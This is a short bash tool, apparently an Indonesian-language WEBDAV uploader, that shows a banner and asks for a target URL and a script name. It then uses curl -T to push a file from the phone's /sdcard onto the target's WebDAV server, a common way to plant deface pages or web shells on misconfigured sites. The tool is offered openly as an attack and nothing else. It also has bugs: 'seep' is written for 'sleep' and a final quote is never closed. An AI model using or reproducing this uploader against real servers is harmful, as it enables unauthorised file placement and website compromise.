clear
figlet '    WEBDAV' | lolcat
echo "    <=====================[]====================>" | lolcat
echo "    <=====[  sama muhammad syahputra       ]=====>" | lolcat
echo  "    <=====[            webdav             ]=====>" | lolcat
echo "    <=====================[]====================>" | lolcat
sleep 1
read -p "Masukan Target =>" target;
read -p "Masukan Nama Scriptnya =>" script;
sleep 1
echo "Proses.."
curl -T /sdcard/$script $target
seep 1
echo ' [*] => Selesai 
sleep 2
